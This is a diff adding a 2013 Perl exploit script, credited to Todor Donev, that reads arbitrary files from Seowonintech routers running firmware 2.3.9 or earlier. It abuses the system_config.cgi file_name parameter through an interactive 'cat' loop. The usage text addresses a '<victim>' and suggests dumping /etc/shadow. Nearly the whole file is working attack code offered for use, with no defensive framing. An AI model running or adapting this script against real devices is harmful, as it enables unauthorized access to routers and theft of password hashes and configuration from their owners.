@@ -1,0 +1,46 @@
+#!/usr/bin/perl
+# 
+# [+] Seowonintech routers * <= fw: 2.3.9 remote root file dumper
+#
+# Author: Todor Donev (todor dot donev at gmail.com)
+# Type: Hardware
+# Platform: Linux
+#
+# Special greetz to Stiliyan Angelov, Tsvetelina Emirska and all 
+# my friends that support me 
+#
+# 2013 Bulgaria
+# 
+use LWP::Simple;
+  
+my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
+if(not defined $ARGV[0])
+{
+     usg();
+     exit;
+}
+print "[+] Seowonintech routers * <= fw: 2.3.9 remote root file dumper\n";
+$check = $host."/cgi-bin/system_config.cgi";
+get($check) || die "[-] Error: $!\n";     
+if (defined $check =~ s/\/etc\///gs){
+     print "[+] Connected to $ARGV[0]\n";
+     print "[+] Exploiting..\n\n";
+}
+while(1){ 
+     print "# cat ";
+     chomp($file=<STDIN>);
+     $bug = $host."/cgi-bin/system_config.cgi?file_name=".$file."&btn_type=load&action=APPLY";
+     if($file eq ""){ print "Enter full path to file!\n"; }
+     $data=get($bug) || die "$!, try another exploit\n";
+     $data =~ s/Null/File not found!/gs;
+     if (defined $data =~ m{rows="30">(.*?)&lt;/textarea&gt;}sx){
+     print $1."\n";
+}}
+sub usg
+{
+     print " [+] Seowonintech routers * <= fw: 2.3.9 remote root file dumper\n";
+     print " [?] usg: perl $0 <victim>\n";
+     print " [?] exmp xpl usg: perl $0 192.168.1.1 :)\n";
+     print " [?] exmp xpl cmd: # cat /etc/shadow :)\n";
+     print " [?] The device use Linux.\n";
+}
